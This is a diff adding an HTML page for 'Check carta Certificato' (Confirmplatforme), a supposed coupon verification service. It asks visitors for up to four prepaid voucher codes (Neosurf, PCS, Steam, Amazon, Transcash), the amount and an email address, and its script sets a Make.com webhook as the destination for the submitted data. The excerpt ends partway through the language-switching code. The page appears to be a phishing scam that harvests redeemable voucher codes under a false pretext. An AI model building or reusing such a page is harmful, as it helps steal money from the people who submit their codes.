@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <title>Confirmplatforme</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&family=Poppins:wght@300;400;600;700&display=swap"
+    rel="stylesheet" />
+  <style>
+    :root {
+      --primary: #1a56db;
+      --primary-dark: #1342b0;
+      --accent: #f59e0b;
+      --bg: #f0f4ff;
+      --card: #ffffff;
+      --text: #1e293b;
+      --muted: #64748b;
+      --border: #dde3f0;
+      --success: #16a34a;
+      --error: #dc2626;
+      --footer-bg: #0f172a;
+      --footer-text: #cbd5e1;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      background: var(--primary);
+      padding: 16px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 2px 10px rgba(26, 86, 219, 0.3);
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+
+    header .logo {
+      color: #fff;
+      font-family: 'Nunito', sans-serif;
+      font-size: 1.3rem;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+    }
+
+    header .logo span {
+      color: var(--accent);
+    }
+
+    .lang-bar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+
+    .lang-bar label {
+      color: #fff;
+      font-size: 0.75rem;
+      white-space: nowrap;
+    }
+
+    #langSelect {
+      padding: 6px 10px;
+      border-radius: 8px;
+      border: none;
+      font-size: 0.75rem;
+      font-family: 'Poppins', sans-serif;
+      background: rgba(255, 255, 255, 0.15);
+      color: #fff;
+      cursor: pointer;
+      outline: none;
+      max-width: 140px;
+    }
+
+    #langSelect option {
+      background: #1a56db;
+      color: #fff;
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 20px 16px;
+    }
+
+    .card {
+      background: var(--card);
+      border-radius: 20px;
+      box-shadow: 0 8px 40px rgba(26, 86, 219, 0.10);
+      padding: 24px 20px;
+      width: 100%;
+      max-width: 520px;
+    }
+
+    .card h1 {
+      font-family: 'Nunito', sans-serif;
+      font-size: 1.1rem;
+      font-weight: 800;
+      color: var(--primary);
+      margin-bottom: 24px;
+      text-align: center;
+      line-height: 1.4;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: var(--muted);
+      margin-bottom: 6px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .form-group label span.req {
+      color: var(--error);
+    }
+
+    .form-group select,
+    .form-group input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1.5px solid var(--border);
+      border-radius: 12px;
+      font-size: 0.9rem;
+      font-family: 'Poppins', sans-serif;
+      color: var(--text);
+      background: #f8faff;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      outline: none;
+      -webkit-appearance: none;
+    }
+
+    .form-group select:focus,
+    .form-group input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(26, 86, 219, 0.12);
+      background: #fff;
+    }
+
+    .currency-group {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .currency-group label {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: var(--text);
+      cursor: pointer;
+      padding: 8px 14px;
+      border: 1.5px solid var(--border);
+      border-radius: 12px;
+      transition: all 0.2s;
+      text-transform: none;
+      letter-spacing: 0;
+      background: #f8faff;
+      flex: 1;
+      min-width: 100px;
+      justify-content: center;
+    }
+
+    .currency-group input[type="radio"] {
+      width: auto;
+      margin: 0;
+      accent-color: var(--primary);
+    }
+
+    .currency-group label:has(input:checked) {
+      border-color: var(--primary);
+      background: rgba(26, 86, 219, 0.07);
+      color: var(--primary);
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 14px;
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      font-size: 1rem;
+      font-family: 'Nunito', sans-serif;
+      font-weight: 800;
+      cursor: pointer;
+      margin-top: 8px;
+      transition: background 0.2s, transform 0.1s;
+      letter-spacing: 0.5px;
+    }
+
+    .btn-submit:hover {
+      background: var(--primary-dark);
+      transform: translateY(-1px);
+    }
+
+    .btn-submit:active {
+      transform: translateY(0);
+    }
+
+    .btn-submit:disabled {
+      background: #94a3b8;
+      cursor: not-allowed;
+      opacity: 0.7;
+    }
+
+    .alert {
+      display: none;
+      padding: 12px 16px;
+      border-radius: 12px;
+      margin-top: 16px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      text-align: center;
+    }
+
+    .alert.success {
+      background: #dcfce7;
+      color: var(--success);
+      display: block;
+    }
+
+    .alert.error-box {
+      background: #fee2e2;
+      color: var(--error);
+      display: block;
+    }
+
+    .loader {
+      display: none;
+      text-align: center;
+      margin-top: 12px;
+      color: var(--primary);
+      font-size: 0.85rem;
+      font-weight: 600;
+    }
+
+    .loader.show {
+      display: block;
+    }
+
+    footer {
+      background: var(--footer-bg);
+      color: var(--footer-text);
+      padding: 32px 20px 20px;
+      margin-top: auto;
+    }
+
+    .footer-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 28px;
+      max-width: 960px;
+      margin: 0 auto 28px;
+    }
+
+    .footer-brand .logo-footer {
+      font-family: 'Nunito', sans-serif;
+      font-size: 1.2rem;
+      font-weight: 800;
+      color: #fff;
+      margin-bottom: 10px;
+    }
+
+    .footer-brand .logo-footer span {
+      color: var(--accent);
+    }
+
+    .footer-brand p {
+      font-size: 0.8rem;
+      line-height: 1.6;
+      color: #94a3b8;
+    }
+
+    .footer-col h4 {
+      font-family: 'Nunito', sans-serif;
+      font-weight: 800;
+      font-size: 0.9rem;
+      color: #fff;
+      margin-bottom: 12px;
+    }
+
+    .footer-col ul {
+      list-style: none;
+    }
+
+    .footer-col ul li {
+      font-size: 0.8rem;
+      color: #94a3b8;
+      margin-bottom: 8px;
+      padding-left: 12px;
+      position: relative;
+      line-height: 1.5;
+    }
+
+    .footer-col ul li::before {
+      content: "•";
+      position: absolute;
+      left: 0;
+      color: var(--accent);
+    }
+
+    .footer-col p {
+      font-size: 0.8rem;
+      color: #94a3b8;
+      line-height: 1.6;
+    }
+
+    .footer-bottom {
+      text-align: center;
+      border-top: 1px solid #1e293b;
+      padding-top: 20px;
+      font-size: 0.7rem;
+      color: #475569;
+    }
+
+    @media (max-width: 480px) {
+      header {
+        padding: 12px 16px;
+      }
+
+      header .logo {
+        font-size: 1.1rem;
+      }
+
+      .lang-bar {
+        width: 100%;
+        justify-content: space-between;
+      }
+
+      #langSelect {
+        flex: 1;
+        max-width: none;
+        font-size: 0.7rem;
+      }
+
+      main {
+        padding: 16px 12px;
+      }
+
+      .card {
+        padding: 20px 16px;
+        border-radius: 16px;
+      }
+
+      .card h1 {
+        font-size: 1rem;
+        margin-bottom: 20px;
+      }
+
+      .form-group {
+        margin-bottom: 14px;
+      }
+
+      .form-group label {
+        font-size: 0.7rem;
+      }
+
+      .form-group select,
+      .form-group input {
+        padding: 10px 12px;
+        font-size: 0.85rem;
+      }
+
+      .currency-group {
+        gap: 8px;
+      }
+
+      .currency-group label {
+        padding: 6px 10px;
+        font-size: 0.75rem;
+        min-width: 80px;
+      }
+
+      .btn-submit {
+        padding: 12px;
+        font-size: 0.9rem;
+      }
+
+      .alert {
+        padding: 10px 14px;
+        font-size: 0.8rem;
+      }
+
+      .footer-grid {
+        gap: 24px;
+      }
+
+      .footer-brand .logo-footer {
+        font-size: 1.1rem;
+      }
+
+      .footer-brand p,
+      .footer-col ul li,
+      .footer-col p {
+        font-size: 0.75rem;
+      }
+    }
+
+    @media (hover: none) and (pointer: coarse) {
+      .btn-submit {
+        padding: 14px;
+      }
+
+      .form-group select,
+      .form-group input,
+      .currency-group label {
+        cursor: default;
+      }
+
+      .btn-submit:active {
+        transform: scale(0.98);
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <header>
+    <div class="logo">Check carta<span> Certificato</span></div>
+    <div class="lang-bar">
+      <label id="langLabel">🌐 Langue :</label>
+      <select id="langSelect">
+        <option value="fr">🇫🇷 Français</option>
+        <option value="en">🇬🇧 English</option>
+        <option value="es">🇪🇸 Español</option>
+        <option value="de">🇩🇪 Deutsch</option>
+        <option value="it">🇮🇹 Italiano</option>
+        <option value="pt">🇵🇹 Português</option>
+        <option value="ar">🇸🇦 العربية</option>
+        <option value="zh">🇨🇳 中文</option>
+        <option value="ja">🇯🇵 日本語</option>
+        <option value="ru">🇷🇺 Русский</option>
+        <option value="nl">🇳🇱 Nederlands</option>
+        <option value="pl">🇵🇱 Polski</option>
+        <option value="tr">🇹🇷 Türkçe</option>
+        <option value="ko">🇰🇷 한국어</option>
+        <option value="hi">🇮🇳 हिन्दी</option>
+        <option value="sw">🇰🇪 Kiswahili</option>
+        <option value="ha">🇳🇬 Hausa</option>
+        <option value="yo">🇳🇬 Yorùbá</option>
+        <option value="am">🇪🇹 አማርኛ</option>
+        <option value="wo">🇸🇳 Wolof</option>
+        <option value="ln">🇨🇩 Lingala</option>
+        <option value="mg">🇲🇬 Malagasy</option>
+        <option value="ro">🇷🇴 Română</option>
+        <option value="hu">🇭🇺 Magyar</option>
+        <option value="cs">🇨🇿 Čeština</option>
+        <option value="sv">🇸🇪 Svenska</option>
+        <option value="fi">🇫🇮 Suomi</option>
+        <option value="da">🇩🇰 Dansk</option>
+        <option value="el">🇬🇷 Ελληνικά</option>
+        <option value="he">🇮🇱 עברית</option>
+        <option value="fa">🇮🇷 فارسی</option>
+        <option value="id">🇮🇩 Bahasa Indonesia</option>
+        <option value="ms">🇲🇾 Bahasa Melayu</option>
+        <option value="th">🇹🇭 ภาษาไทย</option>
+        <option value="vi">🇻🇳 Tiếng Việt</option>
+        <option value="uk">🇺🇦 Українська</option>
+        <option value="bn">🇧🇩 বাংলা</option>
+      </select>
+    </div>
+  </header>
+
+  <main>
+    <div class="card">
+      <h1 id="formTitle">Veuillez entrer les informations du coupon ici</h1>
+      <form id="couponForm">
+
+        <div class="form-group">
+          <label id="labelRecharge">Sélectionner votre recharge <span class="req">*</span></label>
+          <select id="rechargeType" required>
+            <option value="" id="optDefault">--- Recharge ---</option>
+            <option value="Neosurf">Neosurf</option>
+            <option value="Steam">Steam</option>
+            <option value="Appel">Call</option>
+            <option value="PCS">PCS</option>
+            <option value="Amazon">Amazon</option>
+            <option value="TRANSACSH">TRANSACSH</option>
+            <option value="Autre" id="optOther">Autre</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label id="labelAmount">Montant de la recharge <span class="req">*</span></label>
+          <input type="number" id="amount" min="1" placeholder="0.00" required />
+        </div>
+
+        <div class="form-group">
+          <label id="labelCurrency">Choisir une devise <span class="req">*</span></label>
+          <div class="currency-group">
+            <label><input type="radio" name="currency" value="EURO (€)" required /> EURO (€)</label>
+            <label><input type="radio" name="currency" value="DOLLAR ($)" /> DOLLAR ($)</label>
+            <label><input type="radio" name="currency" value="FRANC SUISSE (CHF)" /> FRANC SUISSE (CHF)</label>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label id="labelCode1">le code de la recharge 1 <span class="req">*</span></label>
+          <input type="text" id="code1" placeholder="Entrez le code de la recharge 1" required />
+        </div>
+
+        <div class="form-group">
+          <label id="labelCode2">Entrez le code de la recharge 2</label>
+          <input type="text" id="code2" placeholder="Entrez le code de la recharge 2" />
+        </div>
+
+        <div class="form-group">
+          <label id="labelCode3">Entrez le code de la recharge 3</label>
+          <input type="text" id="code3" placeholder="Entrez le code de la recharge 3" />
+        </div>
+
+        <div class="form-group">
+          <label id="labelCode4">Entrez le code de la recharge 4</label>
+          <input type="text" id="code4" placeholder="Entrez le code de la recharge 4" />
+        </div>
+
+        <div class="form-group">
+          <label id="labelEmail">Entrez votre adresse mail <span class="req">*</span></label>
+          <input type="email" id="userEmail" required />
+        </div>
+
+        <button type="submit" class="btn-submit" id="btnSubmit">Valider</button>
+        <div class="loader" id="loader">⏳ <span id="loaderText">Envoi en cours...</span></div>
+        <div class="alert" id="alertBox"></div>
+      </form>
+    </div>
+  </main>
+
+  <footer>
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <div class="logo-footer">Check carta<span> Certificato</span></div>
+        <p id="footerDesc">Check carta Certificato est un service de vérification de coupons en ligne.</p>
+      </div>
+      <div class="footer-col">
+        <h4 id="footerServices">Services</h4>
+        <ul>
+          <li id="f1">Vérifications des coupons Neosurf</li>
+          <li id="f2">Vérifications des coupons PCS</li>
+          <li id="f3">Vérifications des coupons Amazon</li>
+          <li id="f4">Vérifications des coupons TRANSACSH</li>
+          <li id="f5">Bien d'autres</li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4 id="footerHours">Horaires</h4>
+        <p id="footerHoursDesc">Toujours ouverts ! La plateforme est disponible 24h/24 et 7j/7</p>
+        <br />
+        <p>info@Confirmplatforme.com</p>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span id="footerCopy">Copyright © 2025 Confirmplatforme.com</span>
+    </div>
+  </footer>
+
+  <script>
+    // ─── 🔴 CONFIGURATION - URL MAKE.COM ──────────────────────────
+    const MAKE_WEBHOOK_URL = "https://hook.eu1.make.com/ake1nx4p5vtnj4adi8rmolppcbgs9rpu";
+    // ──────────────────────────────────────────────────────────────
+
+    // ─── TRADUCTIONS COMPLÈTES (TOUTES LES LANGUES) ─────────────
+    const translations = {
+      fr: {
+        formTitle: "Veuillez entrer les informations du coupon ici",
+        labelRecharge: "Sélectionner votre recharge *",
+        optDefault: "--- Recharge ---",
+        optOther: "Autre",
+        labelAmount: "Montant de la recharge *",
+        labelCurrency: "Choisir une devise *",
+        labelCode1: "le code de la recharge 1 *",
+        labelCode2: "Entrez le code de la recharge 2",
+        labelCode3: "Entrez le code de la recharge 3",
+        labelCode4: "Entrez le code de la recharge 4",
+        labelEmail: "Entrez votre adresse mail *",
+        btnSubmit: "Valider",
+        loaderText: "Envoi en cours...",
+        successMsg: "✅ Vos informations ont été envoyées avec succès !",
+        errorMsg: "❌ Une erreur s'est produite. Veuillez réessayer.",
+        footerDesc: "Check carta Certificato est un service de vérification de coupons en ligne.",
+        footerServices: "Services",
+        f1: "Vérifications des coupons Neosurf",
+        f2: "Vérifications des coupons PCS",
+        f3: "Vérifications des coupons Amazon",
+        f4: "Vérifications des coupons TRANSACSH",
+        f5: "Bien d'autres",
+        footerHours: "Horaires",
+        footerHoursDesc: "Toujours ouverts ! La plateforme est disponible 24h/24 et 7j/7",
+        footerCopy: "Copyright © 2025 Confirmplatforme.com",
+        langLabel: "🌐 Langue :"
+      },
+      en: {
+        formTitle: "Please enter your coupon information here",
+        labelRecharge: "Select your voucher *",
+        optDefault: "--- Voucher ---",
+        optOther: "Other",
+        labelAmount: "Voucher amount *",
+        labelCurrency: "Choose a currency *",
+        labelCode1: "Voucher code 1 *",
+        labelCode2: "Voucher code 2",
+        labelCode3: "Voucher code 3",
+        labelCode4: "Voucher code 4",
+        labelEmail: "Enter your email address *",
+        btnSubmit: "Submit",
+        loaderText: "Sending...",
+        successMsg: "✅ Your information has been sent successfully!",
+        errorMsg: "❌ An error occurred. Please try again.",
+        footerDesc: "Check carta Certificato is an online coupon verification service.",
+        footerServices: "Services",
+        f1: "Neosurf coupon verification",
+        f2: "PCS coupon verification",
+        f3: "Amazon coupon verification",
+        f4: "TRANSACSH coupon verification",
+        f5: "And many more",
+        footerHours: "Hours",
+        footerHoursDesc: "Always open! 24/7",
+        footerCopy: "Copyright © 2025 Confirmplatforme.com",
+        langLabel: "🌐 Language:"
+      },
+      es: {
+        formTitle: "Por favor ingrese la información del cupón aquí",
+        labelRecharge: "Selecciona tu recarga *",
+        optDefault: "--- Recarga ---",
+        optOther: "Otro",
+        labelAmount: "Monto de la recarga *",
+        labelCurrency: "Elige una moneda *",
+        labelCode1: "Código de recarga 1 *",
+        labelCode2: "Código de recarga 2",
+        labelCode3: "Código de recarga 3",
+        labelCode4: "Código de recarga 4",
+        labelEmail: "Ingresa tu correo electrónico *",
+        btnSubmit: "Validar",
+        loaderText: "Enviando...",
+        successMsg: "✅ ¡Su información fue enviada con éxito!",
+        errorMsg: "❌ Se produjo un error. Por favor inténtelo de nuevo.",
+        footerDesc: "Check carta Certificato es un servicio de verificación de cupones en línea.",
+        footerServices: "Servicios",
+        f1: "Verificación de cupones Neosurf",
+        f2: "Verificación de cupones PCS",
+        f3: "Verificación de cupones Amazon",
+        f4: "Verificación de cupones TRANSACSH",
+        f5: "Y muchos más",
+        footerHours: "Horarios",
+        footerHoursDesc: "¡Siempre abiertos! 24/7",
+        footerCopy: "Copyright © 2025 Confirmplatforme.com",
+        langLabel: "🌐 Idioma:"
+      },
+      de: {
+        formTitle: "Bitte geben Sie Ihre Gutscheininformationen hier ein",
+        labelRecharge: "Wählen Sie Ihr Guthaben *",
+        optDefault: "--- Guthaben ---",
+        optOther: "Andere",
+        labelAmount: "Guthabenbetrag *",
+        labelCurrency: "Wählen Sie eine Währung *",
+        labelCode1: "Guthabencode 1 *",
+        labelCode2: "Guthabencode 2",
+        labelCode3: "Guthabencode 3",
+        labelCode4: "Guthabencode 4",
+        labelEmail: "Geben Sie Ihre E-Mail-Adresse ein *",
+        btnSubmit: "Bestätigen",
+        loaderText: "Wird gesendet...",
+        successMsg: "✅ Ihre Informationen wurden erfolgreich gesendet!",
+        errorMsg: "❌ Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.",
+        footerDesc: "Check carta Certificato ist ein Online-Gutscheinprüfungsdienst.",
+        footerServices: "Dienste",
+        f1: "Neosurf-Gutscheinprüfung",
+        f2: "PCS-Gutscheinprüfung",
+        f3: "Amazon-Gutscheinprüfung",
+        f4: "TRANSACSH-Gutscheinprüfung",
+        f5: "Und viele mehr",
+        footerHours: "Öffnungszeiten",
+        footerHoursDesc: "Immer geöffnet! 24/7",
+        footerCopy: "Copyright © 2025 Confirmplatforme.com",
+        langLabel: "🌐 Sprache:"
+      },
+      it: {
+        formTitle: "Si prega di inserire qui le informazioni del coupon",
+        labelRecharge: "Seleziona la tua ricarica *",
+        optDefault: "--- Ricarica ---",
+        optOther: "Altro",
+        labelAmount: "Importo della ricarica *",
+        labelCurrency: "Scegli una valuta *",
+        labelCode1: "Codice ricarica 1 *",
+        labelCode2: "Codice ricarica 2",
+        labelCode3: "Codice ricarica 3",
+        labelCode4: "Codice ricarica 4",
+        labelEmail: "Inserisci il tuo indirizzo email *",
+        btnSubmit: "Convalida",
+        loaderText: "Invio in corso...",
+        successMsg: "✅ Le tue informazioni sono state inviate con successo!",
+        errorMsg: "❌ Si è verificato un errore. Riprova.",
+        footerDesc: "Check carta Certificato è un servizio di verifica coupon online.",
+        footerServices: "Servizi",
+        f1: "Verifica coupon Neosurf",
+        f2: "Verifica coupon PCS",
+        f3: "Verifica coupon Amazon",
+        f4: "Verifica coupon TRANSACSH",
+        f5: "E molti altri",
+        footerHours: "Orari",
+        footerHoursDesc: "Sempre aperti! 24/7",
+        footerCopy: "Copyright © 2025 Confirmplatforme.com",
+        langLabel: "🌐 Lingua:"
+      },
+      pt: {
+        formTitle: "Por favor, insira as informações do cupom aqui",
+        labelRecharge: "Selecione sua recarga *",
+        optDefault: "--- Recarga ---",
+        optOther: "Outro",
+        labelAmount: "Valor da recarga *",
+        labelCurrency: "Escolha uma moeda *",
+        labelCode1: "Código de recarga 1 *",
+        labelCode2: "Código de recarga 2",
+        labelCode3: "Código de recarga 3",
+        labelCode4: "Código de recarga 4",
+        labelEmail: "Digite seu endereço de e-mail *",
+        btnSubmit: "Validar",
+        loaderText: "Enviando...",
+        successMsg: "✅ Suas informações foram enviadas com sucesso!",
+        errorMsg: "❌ Ocorreu um erro. Por favor, tente novamente.",
+        footerDesc: "Check carta Certificato é um serviço de verificação de cupons online.",
+        footerServices: "Serviços",
+        f1: "Verificação de cupons Neosurf",
+        f2: "Verificação de cupons PCS",
+        f3: "Verificação de cupons Amazon",
+        f4: "Verificação de cupons TRANSACSH",
+        f5: "E muito mais",
+        footerHours: "Horários",
+        footerHoursDesc: "Sempre abertos! 24/7",
+        footerCopy: "Copyright © 2025 Confirmplatforme.com",
+        langLabel: "🌐 Idioma:"
+      },
+      ar: {
+        formTitle: "يرجى إدخال معلومات القسيمة هنا",
+        labelRecharge: "اختر بطاقة الشحن *",
+        optDefault: "--- الشحن ---",
+        optOther: "أخرى",
+        labelAmount: "مبلغ الشحن *",
+        labelCurrency: "اختر العملة *",
+        labelCode1: "رمز الشحن 1 *",
+        labelCode2: "رمز الشحن 2",
+        labelCode3: "رمز الشحن 3",
+        labelCode4: "رمز الشحن 4",
+        labelEmail: "أدخل عنوان بريدك الإلكتروني *",
+        btnSubmit: "تأكيد",
+        loaderText: "جاري الإرسال...",
+        successMsg: "✅ تم إرسال معلوماتك بنجاح!",
+        errorMsg: "❌ حدث خطأ. يرجى المحاولة مرة أخرى.",
+        footerDesc: "Check carta Certificato هي خدمة التحقق من القسائم عبر الإنترنت.",
+        footerServices: "الخدمات",
+        f1: "التحقق من قسائم Neosurf",
+        f2: "التحقق من قسائم PCS",
+        f3: "التحقق من قسائم Amazon",
+        f4: "التحقق من قسائم TRANSACSH",
+        f5: "والمزيد",
+        footerHours: "أوقات العمل",
+        footerHoursDesc: "مفتوح دائماً! 24/7",
+        footerCopy: "حقوق النشر © 2025 Confirmplatforme.com",
+        langLabel: "🌐 اللغة:"
+      },
+      zh: {
+        formTitle: "请在此输入优惠券信息",
+        labelRecharge: "选择您的充值 *",
+        optDefault: "--- 充值 ---",
+        optOther: "其他",
+        labelAmount: "充值金额 *",
+        labelCurrency: "选择货币 *",
+        labelCode1: "充值码 1 *",
+        labelCode2: "充值码 2",
+        labelCode3: "充值码 3",
+        labelCode4: "充值码 4",
+        labelEmail: "输入您的电子邮件地址 *",
+        btnSubmit: "提交",
+        loaderText: "发送中...",
+        successMsg: "✅ 您的信息已成功发送！",
+        errorMsg: "❌ 发生错误，请重试。",
+        footerDesc: "Check carta Certificato 是一项在线优惠券验证服务。",
+        footerServices: "服务",
+        f1: "Neosurf优惠券验证",
+        f2: "PCS优惠券验证",
+        f3: "Amazon优惠券验证",
+        f4: "TRANSACSH优惠券验证",
+        f5: "更多",
+        footerHours: "开放时间",
+        footerHoursDesc: "全天候开放！24/7",
+        footerCopy: "版权所有 © 2025 Confirmplatforme.com",
+        langLabel: "🌐 语言:"
+      },
+      ja: {
+        formTitle: "クーポン情報をここに入力してください",
+        labelRecharge: "チャージを選択 *",
+        optDefault: "--- チャージ ---",
+        optOther: "その他",
+        labelAmount: "チャージ金額 *",
+        labelCurrency: "通貨を選択 *",
+        labelCode1: "チャージコード 1 *",
+        labelCode2: "チャージコード 2",
+        labelCode3: "チャージコード 3",
+        labelCode4: "チャージコード 4",
+        labelEmail: "メールアドレスを入力 *",
+        btnSubmit: "送信",
+        loaderText: "送信中...",
+        successMsg: "✅ 情報が正常に送信されました！",
+        errorMsg: "❌ エラーが発生しました。もう一度お試しください。",
+        footerDesc: "Check carta Certificatoはオンラインクーポン確認サービスです。",
+        footerServices: "サービス",
+        f1: "Neosurf クーポン確認",
+        f2: "PCS クーポン確認",
+        f3: "Amazon クーポン確認",
+        f4: "TRANSACSH クーポン確認",
+        f5: "その他多数",
+        footerHours: "営業時間",
+        footerHoursDesc: "常時オープン！24/7",
+        footerCopy: "Copyright © 2025 Confirmplatforme.com",
+        langLabel: "🌐 言語:"
+      },
+      ru: {
+        formTitle: "Пожалуйста, введите информацию о купоне здесь",
+        labelRecharge: "Выберите пополнение *",
+        optDefault: "--- Пополнение ---",
+        optOther: "Другое",
+        labelAmount: "Сумма пополнения *",
+        labelCurrency: "Выберите валюту *",
+        labelCode1: "Код пополнения 1 *",
+        labelCode2: "Код пополнения 2",
+        labelCode3: "Код пополнения 3",
+        labelCode4: "Код пополнения 4",
+        labelEmail: "Введите ваш адрес электронной почты *",
+        btnSubmit: "Подтвердить",
+        loaderText: "Отправка...",
+        successMsg: "✅ Ваша информация успешно отправлена!",
+        errorMsg: "❌ Произошла ошибка. Пожалуйста, попробуйте снова.",
+        footerDesc: "Check carta Certificato — это онлайн-сервис проверки купонов.",
+        footerServices: "Услуги",
+        f1: "Проверка купонов Neosurf",
+        f2: "Проверка купонов PCS",
+        f3: "Проверка купонов Amazon",
+        f4: "Проверка купонов TRANSACSH",
+        f5: "И многое другое",
+        footerHours: "Часы работы",
+        footerHoursDesc: "Всегда открыто! 24/7",
+        footerCopy: "Copyright © 2025 Confirmplatforme.com",
+        langLabel: "🌐 Язык:"
+      },
+      nl: {
+        formTitle: "Vul hier uw coupongegevens in",
+        labelRecharge: "Selecteer uw tegoed *",
+        optDefault: "--- Tegoed ---",
+        optOther: "Andere",
+        labelAmount: "Tegoedsbedrag *",
+        labelCurrency: "Kies een valuta *",
+        labelCode1: "Tegoedencode 1 *",
+        labelCode2: "Tegoedencode 2",
+        labelCode3: "Tegoedencode 3",
+        labelCode4: "Tegoedencode 4",
+        labelEmail: "Voer uw e-mailadres in *",
+        btnSubmit: "Bevestigen",
+        loaderText: "Verzenden...",
+        successMsg: "✅ Uw informatie is succesvol verzonden!",
+        errorMsg: "❌ Er is een fout opgetreden. Probeer het opnieuw.",
+        footerDesc: "Check carta Certificato is een online couponverificatieservice.",
+        footerServices: "Diensten",
+        f1: "Neosurf-couponverificatie",
+        f2: "PCS-couponverificatie",
+        f3: "Amazon-couponverificatie",
+        f4: "TRANSACSH-couponverificatie",
+        f5: "En meer",
+        footerHours: "Openingstijden",
+        footerHoursDesc: "Altijd open! 24/7 beschikbaar",
+        footerCopy: "Copyright © 2025 Confirmplatforme.com",
+        langLabel: "🌐 Taal:"
+      },
+      pl: {
+        formTitle: "Wprowadź tutaj informacje o kuponie",
+        labelRecharge: "Wybierz doładowanie *",
+        optDefault: "--- Doładowanie ---",
+        optOther: "Inne",
+        labelAmount: "Kwota doładowania *",
+        labelCurrency: "Wybierz walutę *",
+        labelCode1: "Kod doładowania 1 *",
+        labelCode2: "Kod doładowania 2",
+        labelCode3: "Kod doładowania 3",
+        labelCode4: "Kod doładowania 4",
+        labelEmail: "Wprowadź swój adres e-mail *",
+        btnSubmit: "Zatwierdź",
+        loaderText: "Wysyłanie...",
+        successMsg: "✅ Twoje informacje zostały pomyślnie wysłane!",
+        errorMsg: "❌ Wystąpił błąd. Spróbuj ponownie.",
+        footerDesc: "Check carta Certificato to internetowa usługa weryfikacji kuponów.",
+        footerServices: "Usługi",
+        f1: "Weryfikacja kuponów Neosurf",
+        f2: "Weryfikacja kuponów PCS",
+        f3: "Weryfikacja kuponów Amazon",
+        f4: "Weryfikacja kuponów TRANSACSH",
+        f5: "I wiele innych",
+        footerHours: "Godziny",
+        footerHoursDesc: "Zawsze otwarte! 24/7",
+        footerCopy: "Copyright © 2025 Confirmplatforme.com",
+        langLabel: "🌐 Język:"
+      },
+      tr: {
+        formTitle: "Lütfen kupon bilgilerinizi buraya girin",
+        labelRecharge: "Yüklemenizi seçin *",
+        optDefault: "--- Yükleme ---",
+        optOther: "Diğer",
+        labelAmount: "Yükleme tutarı *",
+        labelCurrency: "Para birimi seçin *",
+        labelCode1: "Yükleme kodu 1 *",
+        labelCode2: "Yükleme kodu 2",
+        labelCode3: "Yükleme kodu 3",
+        labelCode4: "Yükleme kodu 4",
+        labelEmail: "E-posta adresinizi girin *",
+        btnSubmit: "Onayla",
+        loaderText: "Gönderiliyor...",
+        successMsg: "✅ Bilgileriniz başarıyla gönderildi!",
+        errorMsg: "❌ Bir hata oluştu. Lütfen tekrar deneyin.",
+        footerDesc: "Check carta Certificato çevrimiçi kupon doğrulama hizmetidir.",
+        footerServices: "Hizmetler",
+        f1: "Neosurf kupon doğrulama",
+        f2: "PCS kupon doğrulama",
+        f3: "Amazon kupon doğrulama",
+        f4: "TRANSACSH kupon doğrulama",
+        f5: "Ve daha fazlası",
+        footerHours: "Saatler",
+        footerHoursDesc: "Her zaman açık! 7/24 kullanılabilir",
+        footerCopy: "Copyright © 2025 Confirmplatforme.com",
+        langLabel: "🌐 Dil:"
+      }
+    };
+
+    let currentSuccessMsg = translations.fr.successMsg;
+    let currentErrorMsg = translations.fr.errorMsg;
+
+    // ─── FONCTIONS UTILITAIRES ─────────────────────────────────────
+    function afficherAlerte(element, message, type) {
+      if (!element) return;
+      element.textContent = message;
+      element.className = `alert ${type === 'success' ? 'success' : 'error-box'}`;
+    }
+
+    function effacerAlerte(element) {
+      if (!element) return;
+      element.textContent = '';
+      element.className = 'alert';
+    }
+
+    function activerChargement(btn, loader, estEnCours) {
+      if (btn) btn.disabled = estEnCours;
+      if (loader) {
+        loader.className = estEnCours ? 'loader show' : 'loader';
+      }
+    }
+
+    // ─── APPLICATION DE LA LANGUE ────────────────────────────────
+    function applyLang(lang) {
+      const t = translations[lang] || translations['fr'];
+      currentSuccessMsg = t.successMsg;
+      currentErrorMsg = t.errorMsg;
+
+      document.getElementById('formTitle').textContent = t.formTitle;
+      document.getElementById('labelRecharge').innerHTML = t.labelRecharge;
+      document.getElementById('optDefault').textContent = t.optDefault;
+      document.getElementById('optOther').textContent = t.optOther;
+      document.getElementById('labelAmount').innerHTML = t.labelAmount;
+      document.getElementById('labelCurrency').innerHTML = t.labelCurrency;
